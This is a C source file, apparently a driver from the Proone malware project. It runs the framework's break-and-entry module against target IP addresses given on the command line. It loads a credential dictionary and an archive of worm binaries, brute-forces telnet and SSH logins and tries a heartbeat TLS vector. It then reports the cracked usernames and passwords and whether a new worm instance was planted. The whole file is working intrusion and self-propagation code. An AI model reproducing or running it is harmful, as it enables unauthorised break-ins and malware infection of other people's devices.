#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include <errno.h>

#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>

#include <mbedtls/entropy.h>

#include "util_rt.h"
#include "bne.h"
#include "llist.h"
#include "mbedtls.h"
#include "proone_conf/x509.h"


static void print_help (FILE *o, const char *prog) {
	fprintf(
		o,
		"Usage: %s <cred dict> <nybin> <target 0> ... [target N]\n"
		"Options:\n"
		"\t<cred dict>: path to credential dictionary\n"
		"\t<nybin>: path to nybin\n"
		"\ttarget N: IPv4 or IPv6 address\n",
		prog);
}

static bool load_file (const int fd, uint8_t **m, size_t *len) {
	bool ret = true;
	uint8_t *buf;
	size_t buf_size;
	ssize_t f_ret;
	void *ny;

	buf_size = prne_getpagesize();
	buf = prne_malloc(1, buf_size);
	if (buf == 0) {
		perror("prne_malloc()");
		return false;
	}

	while (true) {
		f_ret = read(fd, buf, buf_size);
		if (f_ret == 0) {
			break;
		}
		if (f_ret < 0) {
			perror("read()");
			ret = false;
			break;
		}

		ny = prne_realloc(*m, 1, *len + f_ret);
		if (ny == NULL) {
			perror("prne_realloc()");
			ret = false;
			break;
		}
		*m = (uint8_t*)ny;
		memcpy(*m + *len, buf, f_ret);
		*len += f_ret;
	}

	prne_free(buf);
	return ret;
}

static void load_htbt_ssl_conf (
	mbedtls_x509_crt *ca,
	mbedtls_x509_crt *crt,
	mbedtls_pk_context *key,
	mbedtls_ssl_config *conf,
	mbedtls_ctr_drbg_context *rnd)
{
	static const char *ALP_LIST[] = { PRNE_HTBT_TLS_ALP, NULL };
	static const uint8_t
		CA_CRT[] = PRNE_X509_CA_CRT,
		CRT[] = PRNE_X509_C_CRT,
		KEY[] = PRNE_X509_C_KEY;

	assert(mbedtls_x509_crt_parse(ca, CA_CRT, sizeof(CA_CRT)) == 0);

	assert(
		mbedtls_ssl_config_defaults(
			conf,
			MBEDTLS_SSL_IS_CLIENT,
			MBEDTLS_SSL_TRANSPORT_STREAM,
			MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
		mbedtls_x509_crt_parse(crt, CRT, sizeof(CRT)) == 0 &&
		mbedtls_pk_parse_key(key, KEY, sizeof(KEY), NULL, 0) == 0 &&
		mbedtls_ssl_conf_own_cert(conf, crt, key) == 0);
	assert(mbedtls_ssl_conf_alpn_protocols(conf, ALP_LIST) == 0);
	mbedtls_ssl_conf_ca_chain(conf, ca, NULL);
	mbedtls_ssl_conf_verify(conf, prne_mbedtls_x509_crt_verify_cb, NULL);
	mbedtls_ssl_conf_rng(conf, mbedtls_ctr_drbg_random, rnd);
	mbedtls_ssl_conf_authmode(conf, MBEDTLS_SSL_VERIFY_REQUIRED);
}

static void report_result (const prne_bne_result_t *r) {
	char ip_str[INET6_ADDRSTRLEN];
	const char *vec_str = prne_bne_vector_tostr(r->vec);

	prne_memzero(ip_str, INET6_ADDRSTRLEN);
	if (vec_str == NULL) {
		vec_str = "(unsuccessful)";
	}

	switch (r->subject->ver) {
	case PRNE_IPV_4:
		inet_ntop(AF_INET, r->subject->addr, ip_str, INET6_ADDRSTRLEN);
		break;
	case PRNE_IPV_6:
		inet_ntop(AF_INET6, r->subject->addr, ip_str, INET6_ADDRSTRLEN);
		break;
	default: abort();
	}

	printf(
		"- result:\n"
		"\tsubject: %s\n"
		"\terr: %d\n"
		"\tvector: %s\n"
		"\tny_instance: %s\n",
		ip_str,
		r->err,
		vec_str,
		r->ny_instance ? "true" : "false");
	if (r->vec >= 0) {
		const char *arch_str = prne_arch_tostr(r->arch);

		if (r->cred.id != NULL) {
			printf(
				"\tcred:\n"
				"\t\tid: %s\n"
				"\t\tpw: %s\n",
				r->cred.id,
				r->cred.pw);
		}
		printf("\tprc: %d\n", r->prc);
		if (arch_str != NULL) {
			printf("\tarch: %s\n", arch_str);
		}
	}
}

static char *cb_exec_name (void *ctx) {
	static const char *EXEC_NAME = "proone";
	const size_t len = strlen(EXEC_NAME);
	char *ret = prne_alloc_str(len);

	prne_assert(ret != NULL);
	memcpy(ret, EXEC_NAME, len + 1);

	return ret;
}

int main (const int argc, const char **args) {
	static prne_bne_vector_t ARR_VEC[] = {
		PRNE_BNE_V_HTBT,
		PRNE_BNE_V_BRUTE_TELNET,
		PRNE_BNE_V_BRUTE_SSH
	};
	int ret = 0;
	int fd = -1;
	uint8_t *m_cred_dict = NULL, *m_nybin = NULL;
	size_t cred_dict_len = 0, nybin_len = 0;
	const uint8_t *m_dv, *m_ba;
	size_t dv_len, ba_len;
	prne_ip_addr_t *arr = NULL;
	size_t cnt = 0;
	prne_cred_dict_t dict;
	prne_bin_archive_t ba;
	prne_bne_param_t param;
	prne_pack_rc_t prc;
	mbedtls_entropy_context entropy;
	mbedtls_ctr_drbg_context ctr_drbg;
	struct {
		mbedtls_x509_crt ca;
		mbedtls_x509_crt crt;
		mbedtls_pk_context key;
		mbedtls_ssl_config conf;
	} htbt_ssl;
	pth_event_t ev_root = NULL;
	prne_llist_t wkr_list;

	prne_init_cred_dict(&dict);
	prne_init_bne_param(&param);
	prne_init_bin_archive(&ba);

	mbedtls_x509_crt_init(&htbt_ssl.ca);
	mbedtls_x509_crt_init(&htbt_ssl.crt);
	mbedtls_pk_init(&htbt_ssl.key);
	mbedtls_ssl_config_init(&htbt_ssl.conf);

	mbedtls_entropy_init(&entropy);
	mbedtls_ctr_drbg_init(&ctr_drbg);
	prne_init_llist(&wkr_list);

	prne_assert(pth_init());

	prne_assert(mbedtls_ctr_drbg_seed(
		&ctr_drbg,
		mbedtls_entropy_func,
		&entropy,
		NULL,
		0) == 0);

// TRY
	if (argc < 4) {
		print_help(stderr, args[0]);
		ret = 2;
		goto END;
	}

	load_htbt_ssl_conf(
		&htbt_ssl.ca,
		&htbt_ssl.crt,
		&htbt_ssl.key,
		&htbt_ssl.conf,
		&ctr_drbg);

	cnt = (size_t)argc - 3;
	arr = (prne_ip_addr_t*)prne_calloc(sizeof(prne_ip_addr_t), cnt);
	if (arr == NULL) {
		ret = 2;
		perror("prne_calloc()");
		goto END;
	}
	for (size_t i = 0; i < cnt; i += 1) {
		const char *str = args[i + 3];
		prne_ip_addr_t *e = arr + i;

		if (inet_pton(AF_INET6, str, e->addr)) {
			e->ver = PRNE_IPV_6;
		}
		else if (inet_pton(AF_INET, str, e->addr)) {
			e->ver = PRNE_IPV_4;
		}
		else {
			ret = 2;
			fprintf(stderr, "%s: invalid IP address\n", str);
			goto END;
		}
	}

	fd = open(args[1], O_RDONLY);
	if (fd < 0) {
		perror(args[1]);
		ret = 1;
		goto END;
	}
	if (!load_file(fd, &m_cred_dict, &cred_dict_len)) {
		ret = 1;
		goto END;
	}
	prne_close(fd);

	fd = open(args[2], O_RDONLY);
	if (fd < 0) {
		perror(args[2]);
		ret = 1;
		goto END;
	}
	if (!load_file(fd, &m_nybin, &nybin_len)) {
		ret = 1;
		goto END;
	}
	prne_close(fd);

	if (!prne_dser_cred_dict(&dict, m_cred_dict, cred_dict_len)) {
		perror("prne_dser_cred_dict()");
		ret = 1;
		goto END;
	}

	if (!prne_index_nybin(m_nybin, nybin_len, &m_dv, &dv_len, &m_ba, &ba_len)) {
		fprintf(stderr, "prne_index_nybin() failed.\n");
		ret = 1;
		goto END;
	}

	prc = prne_index_bin_archive(m_ba, ba_len, &ba);
	if (prc != PRNE_PACK_RC_OK) {
		fprintf(
			stderr,
			"prne_index_bin_archive(): %d\n",
			prc);
		ret = 1;
		goto END;
	}

	param.htbt_ssl_conf = &htbt_ssl.conf;
	param.cred_dict = &dict;
	param.vector.arr = ARR_VEC;
	param.vector.cnt = sizeof(ARR_VEC)/sizeof(prne_bne_vector_t);
	param.rcb.m_dv = m_dv;
	param.rcb.dv_len = dv_len;
	param.rcb.ba = &ba;
	param.cb.exec_name = cb_exec_name;

	for (size_t i = 0; i < cnt; i += 1) {
		prne_worker_t *w = prne_malloc(sizeof(prne_worker_t), 1);

		prne_init_worker(w);
		prne_assert(
			w != NULL &&
			prne_llist_append(&wkr_list, (prne_llist_element_t)w) != NULL);

		param.subject = arr[i];
		if (!prne_alloc_bne(w, &ctr_drbg, &param)) {
			perror("prne_alloc_bne()");
			abort();
		}

		w->pth = pth_spawn(PTH_ATTR_DEFAULT, w->entry, w->ctx);
		prne_assert(w->pth != NULL);
	}

	while (wkr_list.size > 0) {
		// rebuild event
		pth_event_free(ev_root, TRUE);
		ev_root = NULL;
		for (prne_llist_entry_t *e = wkr_list.head; e != NULL; e = e->next) {
			prne_worker_t *w = (prne_worker_t*)e->element;
			pth_event_t ev = pth_event(
				PTH_EVENT_TID | PTH_UNTIL_TID_DEAD,
				w->pth);

			prne_assert(ev != NULL);
			if (ev_root == NULL) {
				ev_root = ev;
			}
			else {
				pth_event_concat(ev_root, ev, NULL);
			}
		}

		pth_wait(ev_root);

		// reap
		for (prne_llist_entry_t *e = wkr_list.head; e != NULL;) {
			prne_worker_t *w = (prne_worker_t*)e->element;
			pth_attr_t attr = pth_attr_of(w->pth);
			pth_state_t state;

			prne_assert(
				attr != NULL &&
				pth_attr_get(attr, PTH_ATTR_STATE, &state));
			pth_attr_destroy(attr);
			if (state == PTH_STATE_DEAD) {
				void *result;

				prne_assert(pth_join(w->pth, &result));
				w->pth = NULL;
				report_result((const prne_bne_result_t*)result);

				prne_free_worker(w);
				prne_free(w);
				e = prne_llist_erase(&wkr_list, e);
			}
			else {
				e = e->next;
			}
		}
	}

END: // CATCH
	prne_free_llist(&wkr_list);
	pth_event_free(ev_root, TRUE);
	mbedtls_ctr_drbg_free(&ctr_drbg);
	mbedtls_entropy_free(&entropy);
	mbedtls_x509_crt_free(&htbt_ssl.ca);
	mbedtls_x509_crt_free(&htbt_ssl.crt);
	mbedtls_pk_free(&htbt_ssl.key);
	mbedtls_ssl_config_free(&htbt_ssl.conf);
	prne_free_cred_dict(&dict);
	prne_free_bne_param(&param);
	prne_free_bin_archive(&ba);
	prne_close(fd);
	prne_free(arr);
	prne_free(m_cred_dict);
	prne_free(m_nybin);

	pth_kill();

	return ret;
}
